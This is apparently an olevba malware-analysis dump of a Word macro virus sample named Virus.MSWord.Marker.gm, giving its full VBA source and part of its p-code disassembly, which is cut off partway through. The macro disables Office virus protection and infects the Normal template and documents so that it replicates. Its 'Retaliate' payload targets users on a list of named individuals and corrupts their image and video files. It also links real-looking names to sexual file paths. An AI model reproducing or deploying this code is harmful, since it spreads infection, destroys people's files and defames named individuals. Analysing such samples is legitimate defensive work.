olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim acd, ntt As Object
Dim MyEnemy$(20, 1)
Dim MyPhoto$(10)
Dim MyVideo$(6)
Dim MyExten$(5)
Dim zw As Byte
Const mrk = "čó ŕčŕ čŕĺńč îňâđů îçęç îčńđâéŔ .ÂđńíďńíÔíđâęěń îŕččď ŕŕóĘěńŕîî .Â"
Private Sub document_open()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 If Not acd.codemodule.Find(mrk, 1, 1, 1000, 1000) Then acd.codemodule.deletelines 1, acd.codemodule.countoflines
 If Not ntt.codemodule.Find(mrk, 1, 1, 1000, 1000) Then ntt.codemodule.deletelines 1, ntt.codemodule.countoflines
End Sub
Private Sub document_close()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 s$ = ""
 If (acd.codemodule.countoflines <= 1) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  v2 = 1
  For v = 1 To ntt.codemodule.countoflines
   s$ = ntt.codemodule.lines(v, 1)
   If s$ <> "" Then
    acd.codemodule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 ActiveDocument.Save
 If ntt.codemodule.countoflines <= 1 Then
  v2 = 1
  For v = 1 To acd.codemodule.countoflines
   s$ = acd.codemodule.lines(v, 1)
   If s$ <> "" Then
    ntt.codemodule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 NormalTemplate.Save
 'Retaliate
 MyEnemy$(0, 0) = "Ôđîëîâ Î. Ŕ."
 MyEnemy$(1, 0) = "Ĺěĺëü˙íĺíęî Â. Â."
 MyEnemy$(2, 0) = "Ďîäăîđíîâŕ Ĺ. Č."
 MyEnemy$(3, 0) = "Ěŕňđîńîâŕ Îëüăŕ Ĺâăĺíüĺâíŕ"
 MyEnemy$(4, 0) = "Ęîâŕëĺâŕ Î Ţ"
 MyEnemy$(5, 0) = "Ěîńčí Ę. Ď."
 MyEnemy$(6, 0) = "Řŕëűăčí Ď. Ń."
 MyEnemy$(7, 0) = "Ëčőňĺđ Ŕíŕňîëčé Ěčőŕéëîâč÷"
 MyEnemy$(8, 0) = "Ŕ. Ě. Ęŕđďîâ"
 MyEnemy$(9, 0) = "Ęîçëîâ Ŕíäđĺé Ŕëĺęńŕíäđîâč÷"
 MyEnemy$(10, 0) = "Ďŕâëîâŕ Îëüăŕ"
 MyEnemy$(11, 0) = "Äěčňđčĺâ Ńĺđăĺé"
 MyEnemy$(12, 0) = "Bob Klein"
 MyEnemy$(13, 0) = "Jim Rein"
 MyEnemy$(14, 0) = "John A. Hopkins"
 MyEnemy$(15, 0) = "Garry Wood"
 MyEnemy$(17, 0) = "Debra Henriksen"
 MyEnemy$(18, 0) = "Patricia "
 MyEnemy$(19, 0) = "Hitler"
 
 For v = 0 To 19
  If (v <= 11) Or (v = 19) Then
   MyEnemy$(v, 1) = "C:\Ěîč äîęóěĺíňű"
  Else
   MyEnemy$(v, 1) = "C:\My documents"
  End If
 Next v
 MyEnemy$(0, 1) = MyEnemy$(0, 1) + "\Ňđŕőŕíüĺ\"
 MyEnemy$(1, 1) = MyEnemy$(1, 1) + "\Ďîđíî\"
 MyEnemy$(2, 1) = MyEnemy$(2, 1) + "\Ńĺęń\"
 MyEnemy$(3, 1) = MyEnemy$(3, 1) + "\Čçâđŕůĺíč˙\"
 MyEnemy$(4, 1) = MyEnemy$(4, 1) + "\Ňđŕő\"
 MyEnemy$(5, 1) = MyEnemy$(5, 1) + "\Ęëóáíč÷ęŕ\"
 MyEnemy$(6, 1) = MyEnemy$(6, 1) + "\Äĺâóřęč\Ăĺë˙\"
 MyEnemy$(7, 1) = MyEnemy$(7, 1) + "\Ôîňęč äĺâóřĺę\Ęîěčńńŕđîâŕ Ŕíăĺëčíŕ Âčňŕëüĺâíŕ\"
 MyEnemy$(8, 1) = "C:\Ňîëüęî äë˙ ěĺí˙\Ďîđíóőŕ\Ăĺëęŕ\"
 MyEnemy$(9, 1) = MyEnemy$(9, 1) + "\Îáíŕćĺííŕ˙ íŕňóđŕ\Ŕíăĺëčíŕ\"
 MyEnemy$(10, 1) = MyEnemy$(10, 1) + "\Ńĺęń_ęîëëĺęöč˙\Ęîěčńńŕđîâŕ_Ŕ_Â\"
 MyEnemy$(11, 1) = MyEnemy$(11, 1) + "\Ëó÷řčĺ ďîďęč ăîđîäŕ\"
 MyEnemy$(12, 1) = MyEnemy$(12, 1) + "\Russian Porno\"
 MyEnemy$(13, 1) = MyEnemy$(13, 1) + "\Russian Girls\Comissarova\"
 MyEnemy$(14, 1) = MyEnemy$(14, 1) + "\Russian Fuck\Gelka"
 MyEnemy$(15, 1) = MyEnemy$(15, 1) + "\Nudo\G\"
 MyEnemy$(16, 1) = MyEnemy$(16, 1) + "\Sex Show 1\Gela\"
 MyEnemy$(17, 1) = MyEnemy$(17, 1) + "\Sex Collection\"
 MyEnemy$(18, 1) = MyEnemy$(18, 1) + "\Crazy Sex\"
 MyEnemy$(19, 1) = MyEnemy$(19, 1) + "\Âűńňŕâęŕ ńĺęńŕ\Đîńńč˙\Ŕńňđŕőŕíü\"
 
 MyPhoto$(0) = "Angelina"
 MyPhoto$(1) = "Gela"
 MyPhoto$(2) = "Body_A"
 MyPhoto$(3) = "Fuck"
 MyPhoto$(4) = "Fuck_ass"
 MyPhoto$(5) = "Ass"
 MyPhoto$(6) = "Cnt"
 MyPhoto$(7) = "Klzm"
 MyPhoto$(8) = "Kk"
 MyPhoto$(9) = "Urn"
 
 MyVideo$(0) = "Gela&Seryj"
 MyVideo$(1) = "Gela&Vlad"
 MyVideo$(2) = "Gela&Tolja"
 MyVideo$(3) = "Gela&Oleg"
 MyVideo$(4) = "Gela_Urn"
 MyVideo$(5) = "Gela_Alone"
 
 MyExten$(0) = "jpg"
 MyExten$(1) = "gif"
 MyExten$(2) = "tif"
 MyExten$(3) = "avi"
 MyExten$(4) = "mpg"
 vic$ = ""
 On Error GoTo exit_
 FileNumber = FreeFile
 For en = 0 To 19
  If Application.UserName = MyEnemy$(en, 0) Then
   For vic_name = 0 To 15
    For vic_ext = 0 To 4
     For p_number = 0 To 40
      If vic_name <= 9 Then
       vic$ = MyPhoto$(vic_name)
      Else
       vic$ = MyVideo$(vic_name - 10)
      End If
      s$ = Trim(Str(p_number))
      While Len(s$) < 3
       s$ = "0" + s$
      Wend
      vic$ = vic$ + s$ + "." + MyExten$(vic_ext)
      Open MyEnemy$(en, 1) + vic$ For Input As #FileNumber
      Close #FileNumber
      Open MyEnemy$(en, 1) + vic$ For Binary Access Read Write As #FileNumber Len = 1
      pos = 0
      While Not EOF(FileNumber)
       pos = pos + 1
       Get #FileNumber, pos, zw
       If (Rnd > 0.35) And (Not EOF(FileNumber)) Then
        zw = Int(256 * Rnd)
        Put #FileNumber, pos, zw
       End If
      Wend
      Close #FileNumber
exit_: Resume h
h:
     Next p_number
    Next vic_ext
   Next vic_name
  End If
 Next en
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.gm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10007 bytes
' Line #0:
' 	Dim 
' 	VarDefn acd
' 	VarDefn ntt (As Object)
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0014 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn MyEnemy
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn MyPhoto
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0006 
' 	VarDefn MyVideo
' Line #4:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn MyExten
' Line #5:
' 	Dim 
' 	VarDefn zw (As Byte)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0042 "čó ŕčŕ čŕĺńč îňâđů îçęç îčńđâéŔ .ÂđńíďńíÔíđâęěń îŕččď ŕŕóĘěńŕîî .Â"
' 	VarDefn mrk
' Line #7:
' 	FuncDefn (Private Sub document_open())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set acd 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ntt 
' Line #12:
' 	Ld mrk 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld acd 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld acd 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #13:
' 	Ld mrk 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld ntt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ntt 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub document_close())
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set acd 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ntt 
' Line #20:
' 	LitStr 0x0000 ""
' 	St s$ 
' Line #21:
' 	Ld acd 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Le 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St v2 
' Line #23:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #24:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St s$ 
' Line #25:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #26:
' 	Ld v2 
' 	Ld s$ 
' 	Ld acd 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #27:
' 	Ld v2 
' 	LitDI2 0x0001 
' 	Add 
' 	St v2 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	Ld ntt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	St v2 
' Line #34:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #35:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St s$ 
' Line #36:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #37:
' 	Ld v2 
' 	Ld s$ 
' 	Ld ntt 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #38:
' 	Ld v2 
' 	LitDI2 0x0001 
' 	Add 
' 	St v2 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	QuoteRem 0x0001 0x0009 "Retaliate"
' Line #44:
' 	LitStr 0x000C "Ôđîëîâ Î. Ŕ."
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #45:
' 	LitStr 0x0011 "Ĺěĺëü˙íĺíęî Â. Â."
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #46:
' 	LitStr 0x0010 "Ďîäăîđíîâŕ Ĺ. Č."
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #47:
' 	LitStr 0x001A "Ěŕňđîńîâŕ Îëüăŕ Ĺâăĺíüĺâíŕ"
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #48:
' 	LitStr 0x000C "Ęîâŕëĺâŕ Î Ţ"
' 	LitDI2 0x0004 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #49:
' 	LitStr 0x000B "Ěîńčí Ę. Ď."
' 	LitDI2 0x0005 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #50:
' 	LitStr 0x000D "Řŕëűăčí Ď. Ń."
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #51:
' 	LitStr 0x001A "Ëčőňĺđ Ŕíŕňîëčé Ěčőŕéëîâč÷"
' 	LitDI2 0x0007 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #52:
' 	LitStr 0x000C "Ŕ. Ě. Ęŕđďîâ"
' 	LitDI2 0x0008 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #53:
' 	LitStr 0x001B "Ęîçëîâ Ŕíäđĺé Ŕëĺęńŕíäđîâč÷"
' 	LitDI2 0x0009 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #54:
' 	LitStr 0x000D "Ďŕâëîâŕ Îëüăŕ"
' 	LitDI2 0x000A 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #55:
' 	LitStr 0x000F "Äěčňđčĺâ Ńĺđăĺé"
' 	LitDI2 0x000B 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #56:
' 	LitStr 0x0009 "Bob Klein"
' 	LitDI2 0x000C 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #57:
' 	LitStr 0x0008 "Jim Rein"
' 	LitDI2 0x000D 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #58:
' 	LitStr 0x000F "John A. Hopkins"
' 	LitDI2 0x000E 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #59:
' 	LitStr 0x000A "Garry Wood"
' 	LitDI2 0x000F 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #60:
' 	LitStr 0x000F "Debra Henriksen"
' 	LitDI2 0x0011 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #61:
' 	LitStr 0x0009 "Patricia "
' 	LitDI2 0x0012 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #62:
' 	LitStr 0x0006 "Hitler"
' 	LitDI2 0x0013 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0013 
' 	For 
' Line #65:
' 	Ld v 
' 	LitDI2 0x000B 
' 	Le 
' 	Paren 
' 	Ld v 
' 	LitDI2 0x0013 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #66:
' 	LitStr 0x0010 "C:\Ěîč äîęóěĺíňű"
' 	Ld v 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	LitStr 0x000F "C:\My documents"
' 	Ld v 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000A "\Ňđŕőŕíüĺ\"
' 	Add 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0007 "\Ďîđíî\"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #73:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0006 "\Ńĺęń\"
' 	Add 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #74:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000C "\Čçâđŕůĺíč˙\"
' 	Add 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #75:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0006 "\Ňđŕő\"
' 	Add 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #76:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000B "\Ęëóáíč÷ęŕ\"
' 	Add 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000E "\Äĺâóřęč\Ăĺë˙\"
' 	Add 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #78:
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x002F "\Ôîňęč äĺâóřĺę\Ęîěčńńŕđîâŕ Ŕíăĺëčíŕ Âčňŕëüĺâíŕ\"
' 	Add 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #79:
' 	LitStr 0x0021 "C:\Ňîëüęî äë˙ ěĺí˙\Ďîđíóőŕ\Ăĺëęŕ\"
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #80:
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x001C "\Îáíŕćĺííŕ˙ íŕňóđŕ\Ŕíăĺëčíŕ\"
' 	Add 
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #81:
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0020 "\Ńĺęń_ęîëëĺęöč˙\Ęîěčńńŕđîâŕ_Ŕ_Â\"
' 	Add 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #82:
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0015 "\Ëó÷řčĺ ďîďęč ăîđîäŕ\"
' 	Add 
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #83:
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000F "\Russian Porno\"
' 	Add 
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #84:
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x001B "\Russian Girls\Comissarova\"
' 	Add 
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #85:
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0013 "\Russian Fuck\Gelka"
' 	Add 
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #86:
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0008 "\Nudo\G\"
' 	Add 
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #87:
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0011 "\Sex Show 1\Gela\"
' 	Add 
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #88:
' 	LitDI2 0x0011 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0010 "\Sex Collection\"
' 	Add 
' 	LitDI2 0x0011 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #89:
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000B "\Crazy Sex\"
' 	Add 
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #90:
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0021 "\Âűńňŕâęŕ ńĺęńŕ\Đîńńč˙\Ŕńňđŕőŕíü\"
' 	Add 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #91:
' Line #92:
' 	LitStr 0x0008 "Angelina"
' 	LitDI2 0x0000 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #93:
' 	LitStr 0x0004 "Gela"
' 	LitDI2 0x0001 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #94:
' 	LitStr 0x0006 "Body_A"
' 	LitDI2 0x0002 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #95:
' 	LitStr 0x0004 "Fuck"
' 	LitDI2 0x0003 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #96:
' 	LitStr 0x0008 "Fuck_ass"
' 	LitDI2 0x0004 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #97:
' 	LitStr 0x0003 "Ass"
' 	LitDI2 0x0005 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #98:
' 	LitStr 0x0003 "Cnt"
' 	LitDI2 0x0006 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #99:
' 	LitStr 0x0004 "Klzm"
' 	LitDI2 0x0007 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #100:
' 	LitStr 0x0002 "Kk"
' 	LitDI2 0x0008 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #101:
' 	LitStr 0x0003 "Urn"
' 	LitDI2 0x0009 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #102:
' Line #103:
' 	LitStr 0x000A "Gela&Seryj"
' 	LitDI2 0x0000 
' 	ArgsSt MyVideo$ 0x0001 
' Line #104:
' 	LitStr 0x0009 "Gela&Vlad"
' 	LitDI2 0x0001 
' 	ArgsSt MyVideo$ 0x0001 
' Line #105:
' 	LitStr 0x000A "Gela&Tolja"
' 	LitDI2 0x0002 
' 	ArgsSt MyVideo$ 0x0001 
' Line #106:
' 	LitStr 0x0009 "Gela&Oleg"
' 	LitDI2 0x0003 
' 	ArgsSt MyVideo$ 0x0001 
' Line #107:
' 	LitStr 0x0008 "Gela_Urn"
' 	LitDI2 0x0004 
' 	ArgsSt MyVideo$ 0x0001 
' Line #108:
' 	LitStr 0x000A "Gela_Alone"
' 	LitDI2 0x0005 
' 	ArgsSt MyVideo$ 0x0001 
' Line #109:
' Line #110:
' 	LitStr 0x0003 "jpg"
' 	LitDI2 0x0000 
' 	ArgsSt MyExten$ 0x0001 
' Line #111:
' 	LitStr 0x0003 "gif"
' 	LitDI2 0x0001 
' 	ArgsSt MyExten$ 0x0001 
' Line #112:
' 	LitStr 0x0003 "tif"
' 	LitDI2 0x0002 
' 	ArgsSt MyExten$ 0x0001 
' Line #113:
' 	LitStr 0x0003 "avi"
' 	LitDI2 0x0003 
' 	ArgsSt MyExten$ 0x0001 
' Line #114:
' 	LitStr 0x0003 "mpg"
' 	LitDI2 0x0004 
' 	ArgsSt MyExten$ 0x0001 
' Line #115:
' 	LitStr 0x0000 ""
' 	St vic$ 
' Line #116:
' 	OnError exit_ 
' Line #117:
' 	Ld Friend 
' 	St FileNumber 
' Line #118:
' 	StartForVariable 
' 	Ld en 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0013 
' 	For 
' Line #119:
' 	Ld Application 
' 	MemLd UserName 
' 	Ld en 
' 	LitDI2 0x0000 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Eq 
' 	IfBlock 
' Line #120:
' 	StartForVariable 
' 	Ld vic_name 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x000F 
' 	For 
' Line #121:
' 	StartForVariable 
' 	Ld vic_ext 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #122:
' 	StartForVariable 
' 	Ld p_number 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0028 
' 	For 
' Line #123:
' 	Ld vic_name 
' 	LitDI2 0x0009 
' 	Le 
' 	IfBlock 
' Line #124:
' 	Ld vic_name 
' 	ArgsLd MyPhoto$ 0x0001 
' 	St vic$ 
' Line #125:
' 	ElseBlock 
' Line #126:
' 	Ld vic_name 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd MyVideo$ 0x0001 
' 	St vic$ 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	Ld p_number 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	St s$ 
' Line #129:
' 	Ld s$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	While 
' Line #130:
' 	LitStr 0x0001 "0"
' 	Ld s$ 
' 	Add 
' 	St s$ 
' Line #131:
' 	Wend 
' Line #132:
' 	Ld vic$ 
' 	Ld s$ 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld vic_ext 
' 	ArgsLd MyExten$ 0x0001 
' 	Add 
' 	St vic$ 
' Line #133:
' 	Ld en 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Ld vic$ 
' 	Add 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #134:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #135:
' 	Ld en 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Ld vic$ 
' 	Add 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Open (For Binary Access Read Write)
' Line #136:
' 	LitDI2 0x0000 
' 	St pos 
' Line #137:
